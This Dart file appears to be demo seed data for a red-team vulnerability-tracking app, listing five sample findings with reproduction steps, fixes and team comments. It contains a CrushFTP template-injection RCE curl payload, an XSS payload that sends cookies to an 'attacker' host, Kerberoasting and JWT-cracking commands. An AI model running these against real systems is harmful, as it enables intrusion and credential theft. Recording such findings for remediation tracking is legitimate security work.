import 'package:uuid/uuid.dart';
import '../../domain/entities/vulnerability.dart';

abstract final class VulnSeedData {
  static final _now = DateTime.now();

  static List<Vulnerability> get demoFindings => [
        Vulnerability(
          id: 'vuln-001',
          title: 'CrushFTP SSTI → RCE',
          cveId: 'CVE-2024-4040',
          description:
              'Server-Side Template Injection in CrushFTP admin panel allows '
              'unauthenticated remote code execution via crafted template payload.',
          severity: VulnSeverity.critical,
          status: VulnStatus.inReview,
          type: VulnType.poc,
          projectName: 'Operation Nightfall',
          assignedTo: 'Ahmed (Backend)',
          reproductionSteps: '''
1. Navigate to /WebInterface/function/
2. Inject payload: \${7*7} in template parameter
3. Escalate to RCE via freemarker SSTI chain
4. Obtain SYSTEM shell on WIN-FTP01''',
          pocCode: r'''curl -k "https://target/WebInterface/function/?command=..." \
  -d "template=${T(java.lang.Runtime).getRuntime().exec('whoami')}"''',
          remediationCode: '''// Patch CrushFTP to latest version
// Disable anonymous template rendering
// WAF rule: block \${.*} patterns in query params''',
          tags: ['SSTI', 'RCE', 'CrushFTP', 'Unauthenticated'],
          comments: [
            VulnComment(
              id: 'c1',
              author: 'Khalid',
              role: 'Red Team Lead',
              text: 'PoC verified on staging. Critical — escalate to dev immediately.',
              createdAt: _now.subtract(const Duration(hours: 2)),
            ),
            VulnComment(
              id: 'c2',
              author: 'Ahmed',
              role: 'Developer',
              text: 'Reviewing patch path. ETA 48h for CrushFTP upgrade.',
              createdAt: _now.subtract(const Duration(hours: 1)),
            ),
          ],
          createdAt: _now.subtract(const Duration(days: 1)),
          updatedAt: _now.subtract(const Duration(hours: 1)),
        ),
        Vulnerability(
          id: 'vuln-002',
          title: 'IDOR in /api/v1/users/{id}',
          description:
              'Authenticated users can access other users\' profiles by '
              'incrementing the user ID parameter without authorization checks.',
          severity: VulnSeverity.high,
          status: VulnStatus.open,
          type: VulnType.vulnerability,
          projectName: 'Operation Nightfall',
          assignedTo: 'Sara (API Team)',
          reproductionSteps: '''
1. Login as user ID 1042
2. GET /api/v1/users/1043 with same session token
3. Observe full PII of another user returned (200 OK)''',
          remediationCode: '''// ✅ Authorization check on every resource access
Future<User> getUser(String requestedId, String authUserId) async {
  if (requestedId != authUserId && !await isAdmin(authUserId)) {
    throw ForbiddenException();
  }
  return _repo.findById(requestedId);
}''',
          tags: ['IDOR', 'API', 'Broken Access Control'],
          comments: [
            VulnComment(
              id: 'c3',
              author: 'Khalid',
              role: 'Red Team',
              text: 'Ticket raised — waiting for dev review.',
              createdAt: _now.subtract(const Duration(hours: 5)),
            ),
          ],
          createdAt: _now.subtract(const Duration(days: 2)),
          updatedAt: _now.subtract(const Duration(hours: 5)),
        ),
        Vulnerability(
          id: 'vuln-003',
          title: 'Weak JWT Secret (HS256)',
          description:
              'JWT tokens signed with a dictionary-word secret. '
              'Cracked offline in under 4 minutes using hashcat.',
          severity: VulnSeverity.high,
          status: VulnStatus.remediated,
          type: VulnType.vulnerability,
          projectName: 'Operation Nightfall',
          assignedTo: 'Omar (Security)',
          reproductionSteps: '''
1. Capture JWT from Authorization header
2. jwt_tool -C -d /usr/share/wordlists/rockyou.txt
3. Secret found: "supersecret123"
4. Forge admin token with role: admin''',
          remediationCode: '''// Rotate to RS256 with key pair stored in HSM/Vault
// Minimum 256-bit random secret if staying HS256
final secret = await vault.read('jwt_signing_key');''',
          tags: ['JWT', 'Auth', 'Cryptography'],
          comments: [
            VulnComment(
              id: 'c4',
              author: 'Omar',
              role: 'Developer',
              text: 'Secret rotated. RS256 migration deployed to production.',
              createdAt: _now.subtract(const Duration(days: 1)),
            ),
            VulnComment(
              id: 'c5',
              author: 'Khalid',
              role: 'Red Team',
              text: 'Verified fix — unable to forge tokens. Closing.',
              createdAt: _now.subtract(const Duration(hours: 12)),
            ),
          ],
          createdAt: _now.subtract(const Duration(days: 5)),
          updatedAt: _now.subtract(const Duration(hours: 12)),
        ),
        Vulnerability(
          id: 'vuln-004',
          title: 'Kerberoastable SPN — svc_sql',
          description:
              'Service account svc_sql has SPN registered and weak password. '
              'TGS ticket crackable offline for domain privilege escalation.',
          severity: VulnSeverity.critical,
          status: VulnStatus.open,
          type: VulnType.vulnerability,
          projectName: 'AD Assault Phase 2',
          reproductionSteps: '''
1. GetUserSPNs.py CORP.LOCAL/user:pass -dc-ip 10.0.0.5
2. hashcat -m 13100 kerberoast.hash rockyou.txt
3. Password cracked: Summer2024!
4. PsExec to SQL-PROD01 as svc_sql''',
          tags: ['Active Directory', 'Kerberoast', 'Privilege Escalation'],
          createdAt: _now.subtract(const Duration(hours: 8)),
          updatedAt: _now.subtract(const Duration(hours: 3)),
        ),
        Vulnerability(
          id: 'vuln-005',
          title: 'Stored XSS in Support Portal',
          description:
              'Ticket description field does not sanitize HTML. '
              'Payload executes when admin views ticket dashboard.',
          severity: VulnSeverity.medium,
          status: VulnStatus.inReview,
          type: VulnType.poc,
          projectName: 'Operation Nightfall',
          assignedTo: 'Layla (Frontend)',
          pocCode: '<img src=x onerror="fetch(\'https://attacker/?c=\'+document.cookie)">',
          remediationCode: '''// Sanitize on input AND encode on output
import 'package:html_unescape/html_unescape.dart';
final safe = HtmlEscape().convert(userInput);''',
          tags: ['XSS', 'Web', 'Stored'],
          createdAt: _now.subtract(const Duration(days: 3)),
          updatedAt: _now.subtract(const Duration(days: 1)),
        ),
      ];

  static Vulnerability emptyDraft({String projectName = 'Operation Nightfall'}) {
    final id = const Uuid().v4();
    final now = DateTime.now();
    return Vulnerability(
      id: id,
      title: '',
      description: '',
      severity: VulnSeverity.medium,
      status: VulnStatus.open,
      type: VulnType.vulnerability,
      projectName: projectName,
      createdAt: now,
      updatedAt: now,
    );
  }
}
